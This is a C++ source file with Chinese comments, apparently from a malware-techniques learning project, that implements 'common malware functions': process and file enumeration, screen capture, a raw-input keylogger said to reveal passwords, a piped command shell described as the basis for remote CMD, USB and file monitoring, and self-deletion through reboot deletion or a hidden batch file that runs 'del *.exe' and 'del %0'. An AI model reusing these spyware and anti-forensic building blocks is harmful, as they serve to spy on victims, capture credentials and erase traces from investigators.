// CommonTech.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>

/**
 * 恶意程序常见功能实现
 */

 /**
  * 进程遍历
  * 可以通过进程信息分析用户环境
  * 方式：
  * 进程快照、Win32API函数ZwQuerySystemInformation或者EnumProcesses函数、通过PowerShell、WMI获取
  *
  * 这里选取最常见的进程快照方式
  */
#include "EnumInfo.h"
void test_processes()
{
	// 遍历进程
	if (FALSE == EnumProcess())
	{
		printf("Enum Process Error!\n");
	}

	system("pause");
	system("cls");

	// 遍历线程
	if (FALSE == EnumThread())
	{
		printf("Enum Thread Error!\n");
	}

	system("pause");
	system("cls");

	// 遍历指定进程模块
	if (FALSE == EnumProcessModule(15452))
	{
		printf("Enum Process Module Error!\n");
	}

	system("pause");
}

/**
 * 遍历文件
 */
#include "FileSearch.h"
void test_files()
{
	SearchFile("C:\\workspaceKernel\\HackTechLearning\\Debug");

	system("pause");
}

/**
 * 桌面截屏
 * 这个技术在市面上，不止截屏，甚至能做到完全的远程控制
 */
#include "ScreenCapture.h"
void test_screen()
{
	if (FALSE == ScreenCapture())
	{
		printf("Screen Cpature Error.\n");
		return;
	}

	printf("Screen Cpature OK.\n");
	system("pause");
}

/**
 * 按键记录
 * 通过按键记录，可以推测出部分账号密码
 */
#include "RawInputTest.h"
BOOL CALLBACK ProgMainDlg(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	if (WM_INITDIALOG == uiMsg)
	{
		// 注册原始输入设备
		Init(hWnd);
	}
	else if (WM_CLOSE == uiMsg)
	{
		::EndDialog(hWnd, NULL);
	}
	else if (WM_INPUT == uiMsg)
	{
		// 获取获取按键消息
		GetData(lParam);
	}

	return FALSE;
}


int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevinstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	::DialogBoxParam(hInstance, NULL, NULL, (DLGPROC)ProgMainDlg, NULL);

	::ExitProcess(NULL);
	return 0;
}
//需要作为mfc程序入口点生效
void test_keyboard()
{
	WinMain(0, 0, 0, 0);
}

/**
 * 远程CMD
 * 此例为本地执行
 * 做到远程需要加上网络传输模块
 */
#include "PipeCmd.h"
void test_cmd()
{
	char szCmd[] = "ping 127.0.0.1";
	char szResultBuffer[512] = { 0 };
	DWORD dwResultBufferSize = 512;

	// 执行 cmd 命令, 并获取执行结果数据
	if (FALSE == PipeCmd(szCmd, szResultBuffer, dwResultBufferSize))
	{
		printf("pipe cmd error.\n");
	}
	else
	{
		printf("CMD执行结果为:\n%s\n", szResultBuffer);
	}

	system("pause");
}

/**
 * U盘监控
 * 通过WM_DEVICECHANGE消息监测外设的插拔
 */
#include <Dbt.h>
LRESULT OnDeviceChange(WPARAM wParam, LPARAM lParam)
{
	switch (wParam)
	{
		// 设备已经插入
	case DBT_DEVICEARRIVAL:
	{
		PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
		// 逻辑卷
		if (DBT_DEVTYP_VOLUME == lpdb->dbch_devicetype)
		{
			// 根据 dbcv_unitmask 计算出设备盘符
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			DWORD dwDriverMask = lpdbv->dbcv_unitmask;
			DWORD dwTemp = 1;
			char szDriver[4] = "A:\\";
			for (szDriver[0] = 'A'; szDriver[0] <= 'Z'; szDriver[0]++)
			{
				if (0 < (dwTemp & dwDriverMask))
				{
					// 获取设备盘符
					::MessageBox(NULL, szDriver, "设备已插入", MB_OK);
				}
				// 左移1位, 接着判断下一个盘符
				dwTemp = (dwTemp << 1);
			}
		}
		break;
	}
	// 设备已经移除
	case DBT_DEVICEREMOVECOMPLETE:
	{
		PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
		// 逻辑卷
		if (DBT_DEVTYP_VOLUME == lpdb->dbch_devicetype)
		{
			// 根据 dbcv_unitmask 计算出设备盘符
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			DWORD dwDriverMask = lpdbv->dbcv_unitmask;
			DWORD dwTemp = 1;
			char szDriver[4] = "A:\\";
			for (szDriver[0] = 'A'; szDriver[0] <= 'Z'; szDriver[0]++)
			{
				if (0 < (dwTemp & dwDriverMask))
				{
					// 获取设备盘符
					::MessageBox(NULL, szDriver, "设备已移除", MB_OK);
				}
				// 左移1位, 接着判断下一个盘符
				dwTemp = (dwTemp << 1);
			}
		}
		break;
	}
	default:
		break;
	}

	return 0;
}

BOOL CALLBACK USB_ProgMainDlg(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	if (WM_DEVICECHANGE == uiMsg)
	{
		OnDeviceChange(wParam, lParam);
	}
	else if (WM_CLOSE == uiMsg)
	{
		::EndDialog(hWnd, NULL);
	}

	return FALSE;
}

void test_USB()
{
	//WinMain中注册上面的消息函数即可
}

/**
 * 文件监控
 * 对计算机上的所有文件操作进行监控，Windows提供了接口函数ReadDirectoryChangesW
 */
#include "MonitorFile.h"
void test_file_op()
{
	// 注意目录路径的末尾要加上反斜杠'\'
	MonitorFile("C:\\workspaceKernel\\HackTechLearning\\Debug\\");

	printf("monitor...\n");
	getchar();
}

/**
 * 自删除
 * 程序完成自身任务时，删除自身，不留痕迹
 */

//利用MoveFileEx函数实现重启删除
BOOL RebootDelete(const char* pszFileName)
{
	// 重启删除文件
	char szTemp[MAX_PATH] = "\\\\?\\"; //路径开头加上“\\?\”前缀
	::lstrcat(szTemp, pszFileName);
	BOOL bRet = ::MoveFileEx(szTemp, NULL, MOVEFILE_DELAY_UNTIL_REBOOT); //重启后删除，执行的动作必须是重启才有效，并且需要管理员权限
	return bRet;
}
void test_move()
{
	if (FALSE == RebootDelete("C:\\workspaceKernel\\HackTechLearning\\Debug\\CommonTech.exe"))
	{
		printf("Set Reboot Delete Error.\n");
	}
	else
	{
		printf("Set Reboot Delete OK.\n");
	}

	system("pause");
}

//利用批处理延迟命令删除
BOOL CreateChoiceBat(char* pszBatFileName)
{
	int iTime = 5;
	char szBat[MAX_PATH] = { 0 };

	// 构造批处理内容 （XP不支持choice命令）
	/*
		@echo off
		choice /t 5 /d y /n >nul
		del *.exe
		del %0
	*/
	::wsprintf(szBat, "@echo off\nchoice /t %d /d y /n >nul\ndel *.exe\ndel %%0\n", iTime);

	// 生成批处理文件
	FILE* fp = NULL;
	fopen_s(&fp, pszBatFileName, "w+");
	if (NULL == fp)
	{
		return FALSE;
	}
	fwrite(szBat, (1 + ::lstrlen(szBat)), 1, fp);
	fclose(fp);

	return TRUE;
}


BOOL CreatePingBat(char* pszBatFileName)
{
	int iTime = 5;
	char szBat[MAX_PATH] = { 0 };

	// 构造批处理内容
	/*
		@echo off
		ping 127.0.0.1 -n 5
		del *.exe
		del %0
	*/
	::wsprintf(szBat, "@echo off\nping 127.0.0.1 -n %d\ndel *.exe\ndel %%0\n", iTime);

	// 生成批处理文件
	FILE* fp = NULL;
	fopen_s(&fp, pszBatFileName, "w+");
	if (NULL == fp)
	{
		return FALSE;
	}
	fwrite(szBat, (1 + ::lstrlen(szBat)), 1, fp);
	fclose(fp);

	return TRUE;
}


BOOL DelSelf(int iType)
{
	BOOL bRet = FALSE;
	char szCurrentDirectory[MAX_PATH] = { 0 };
	char szBatFileName[MAX_PATH] = { 0 };
	char szCmd[MAX_PATH] = { 0 };

	// 获取当前程序所在目录
	::GetModuleFileName(NULL, szCurrentDirectory, MAX_PATH);
	char* p = strrchr(szCurrentDirectory, '\\');
	p[0] = '\0';
	// 构造批处理文件路径
	::wsprintf(szBatFileName, "%s\\temp.bat", szCurrentDirectory);
	// 构造调用执行批处理的 CMD 命令行
	::wsprintf(szCmd, "cmd /c call \"%s\"", szBatFileName);

	// 创建自删除的批处理文件
	if (0 == iType)
	{
		// choice 方式
		bRet = CreateChoiceBat(szBatFileName);
	}
	else if (1 == iType)
	{
		// ping 方式
		bRet = CreatePingBat(szBatFileName);
	}

	// 创建新的进程, 以隐藏控制台的方式执行批处理
	if (bRet)
	{
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi;
		si.cb = sizeof(si);
		//指定wShowWindow成员有效
		si.dwFlags = STARTF_USESHOWWINDOW;
		//此成员设为TRUE的话则显示新建进程的主窗口
		si.wShowWindow = FALSE;
		BOOL bRet = CreateProcess(
			//不在此指定可执行文件的文件名
			NULL,
			//命令行参数
			szCmd,
			//默认进程安全性
			NULL,
			//默认进程安全性
			NULL,
			//指定当前进程内句柄不可以被子进程继承
			FALSE,
			//为新进程创建一个新的控制台窗口
			CREATE_NEW_CONSOLE,
			//使用本进程的环境变量
			NULL,
			//使用本进程的驱动器和目录
			NULL,
			&si,
			&pi);
		if (bRet)
		{
			//不使用的句柄最好关掉
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);

			// 结束进程
			exit(0);
			::ExitProcess(NULL);
		}
	}

	return bRet;
}

void test_bat()
{
	// 程序自删除
	BOOL bRet = DelSelf(1);
	if (FALSE == bRet)
	{
		printf("Selft Delete Error!\n");
	}
	else
	{
		printf("Selft Delete OK!\n");
	}

	system("pause");
}

void test_delete()
{
	//test_move();
	test_bat();
}

int main()
{
	//进程遍历
	//test_processes();

	//文件遍历
	//test_files();

	//桌面截屏
	//test_screen();

	//按键记录
	//test_keyboard();

	//cmd
	//test_cmd();

	//usb
	//test_USB();

	//文件操作监控
	//test_file_op();

	//自删除
	test_delete();
	return 0;
}

